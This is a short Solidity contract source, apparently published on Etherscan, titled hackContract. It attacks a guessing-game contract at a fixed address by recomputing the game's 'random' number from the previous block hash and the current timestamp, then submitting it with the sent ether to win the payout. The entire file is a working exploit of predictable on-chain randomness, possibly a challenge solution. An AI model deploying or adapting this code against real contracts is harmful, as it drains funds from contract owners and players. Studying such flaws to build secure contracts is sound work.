/**
 *Submitted for verification at Etherscan.io on 2022-05-22
*/

pragma solidity ^0.4.21;

contract guessInterface {
    function guess(uint8 n) external payable;
}

contract hackContract {
    address guessInterfaceAddress = 0x7ECd21bF89f4CC4BA289C2a5571b1D44363dcc39;
    guessInterface guessContract = guessInterface(guessInterfaceAddress);

    function tryHack() public payable {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        guessContract.guess.value(msg.value)(answer);
    }
}